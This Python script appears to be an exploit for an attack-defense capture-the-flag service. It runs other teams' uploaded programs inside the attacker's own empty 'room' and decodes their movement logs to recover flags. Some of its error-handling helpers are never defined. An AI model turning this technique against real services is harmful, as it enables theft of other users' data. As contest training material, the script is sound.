#!/usr/bin/env python3

import sys
import traceback
import string
import random
import re
import binascii
import socket
import collections

PORT = 12500
DELIM = "========================================================="
HELLO_LINES = 15
BASE = 2
HEIGHT = 8

def get_rand_string(l):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(l))

def generate_program(flag):
    return "N0000"

def send(request, socket):
    try:
        socket.sendall(request.encode('utf-8'))
        socket.sendall(b'\n')
    except Exception as e:
        service_down(message=str(e), exception=e)
        raise e

def readline(socket_fd):
    try:
        return socket_fd.readline().rstrip()
    except Exception as e:
        service_mumble(message=str(e), exception=e)
        raise e

def skip_hello(socket_fd):
    for _ in range(HELLO_LINES):
        readline(socket_fd)

class State:
    def __init__(self, hostname):
        self.hostname = hostname

    def connect_to_service(self):
        try:
            return socket.create_connection((self.hostname, PORT))
        except Exception as e:
            service_down(message=str(e), exception=e)
            raise e

    def do_list(self, entity):
        socket = self.connect_to_service()
        socket_fd = socket.makefile('r')
        skip_hello(socket_fd)
        send("list", socket)
        send(entity, socket)
        line = readline(socket_fd)
        if line != DELIM:
            return service_mumble(message="Bad response", error=make_err_message("Bad status", "list\n{}".format(entity), line))
        line = readline(socket_fd)
        result = []
        while line != DELIM:
            result.append(line)
            line = readline(socket_fd)
        return result

    def list_rooms(self):
        return self.do_list("rooms")

    def list_programs(self):
        return self.do_list("programs")

    def get_room(self, room, password):
        socket = self.connect_to_service()
        socket_fd = socket.makefile()
        skip_hello(socket_fd)
        send("get_room", socket)
        send(password, socket)
        send(room, socket)
        line = readline(socket_fd)
        return line

    def put(self, flag):
        password = get_rand_string(32)
        room_name = get_rand_string(32)
        program_name = get_rand_string(32)
        room = binascii.hexlify(flag.encode('utf-8')).decode('utf-8')

        socket = self.connect_to_service()
        socket_fd = socket.makefile()
        skip_hello(socket_fd)
        send("upload", socket)
        send(password, socket)
        send("room", socket)
        send(room_name, socket)
        send(room, socket)
        send("program", socket)
        send(program_name, socket)
        send(generate_program(flag), socket)

        return room_name, program_name, password 

    def run(self, room, program, password):
        socket = self.connect_to_service()
        socket_fd = socket.makefile()
        skip_hello(socket_fd)
        send("run", socket)
        send(password, socket)
        send(room, socket)
        send(program, socket)
        return readline(socket_fd)

def get_flag_from_log(log):
    room = [[1] * 8 for x in range(0,32)]
    idx = 0
    x, y = 0, 0
    while idx < len(log):
        c = log[idx]
        if c == 'N':
            x = int(log[idx+1:idx+3])
            y = int(log[idx+3:idx+5])
            idx += 5
            room[x][y] = 0
        elif c in 'RLUD':
            num = int(log[idx+1:idx+3])
            for i in range(num):
                if c == 'R':
                    x += 1
                elif c == 'L':
                    x -= 1
                elif c == 'U':
                    y += 1
                elif c == 'D':
                    y -= 1
                room[x][y] = 0
            idx += 3
        else:
            break
    result = ''
    for x in room:
        col = [str(i) for i in x]
        col.reverse()
        result += chr(int(''.join(col), 2))
    return result

def main():
    hostname = sys.argv[1]

    empty_room = " " * (32 * 8)
    state = State(hostname)

    room, _program, password = state.put(empty_room)
    programs = state.list_programs() 

    for program in programs:
        try:
            log = state.run(room, program, password)
            flag = get_flag_from_log(log)
            if not flag.endswith('='):
                continue
            print(flag)
        except:
            pass

if __name__ == "__main__":
    main()
